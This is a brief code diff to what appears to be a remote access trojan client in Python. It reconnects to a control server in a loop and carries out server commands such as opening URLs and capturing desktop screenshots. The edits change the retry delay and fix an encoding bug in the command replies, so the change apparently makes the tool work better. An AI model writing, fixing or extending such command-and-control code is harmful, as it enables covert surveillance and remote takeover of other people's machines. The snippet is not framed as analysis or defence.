@@ -37,7 +37,7 @@ def connect_to_server():
             return client
 
         except:
-            time.sleep(2)
+            time.sleep(10)
             continue
 
 
@@ -342,7 +342,7 @@ def handle_incoming_commands(client):
                 elif server_command.lower().startswith("open_url"):
                     url = server_command.split(" ", 1)[1]
                     webbrowser.open(url)
-                    client.sendall(f"[URL] Open '{url}' successful.")
+                    client.sendall(f"[URL] Open '{url}' successful.".encode())
 
                 elif server_command.lower() == "screenshot":
                     send_desktop_screenshot(client)
